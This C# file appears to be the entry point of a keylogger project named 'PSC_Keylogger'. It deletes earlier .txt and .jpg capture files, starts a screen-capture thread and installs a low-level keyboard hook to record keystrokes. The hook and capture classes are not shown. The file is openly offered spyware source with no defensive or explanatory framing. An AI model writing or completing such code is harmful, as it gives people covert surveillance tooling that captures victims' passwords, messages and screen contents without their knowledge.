using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace PSC_Keylogger
{
    static class Program
    {
        private static IntPtr hook;

        private static void Main(string[] args)
        {
            ClearDirectory();

            System.Threading.Thread captureThread = new System.Threading.Thread(ScreenCaptureManager.CaptureDesktop);
            captureThread.Start();

            hook = BaseKeylogger.SetHook(BaseKeylogger.llkProcedure);
            Application.Run();
        }

        private static void ClearDirectory()
        {
            string directoryPath = BaseKeylogger.DIRECTORY_FILE_NAME;
            string[] files = Directory.GetFiles(directoryPath);
            foreach(string file in files)
            {
                if (file.EndsWith(".txt") || file.EndsWith(".jpg"))
                {
                    File.Delete(file);
                }
            }
        }
    }
}
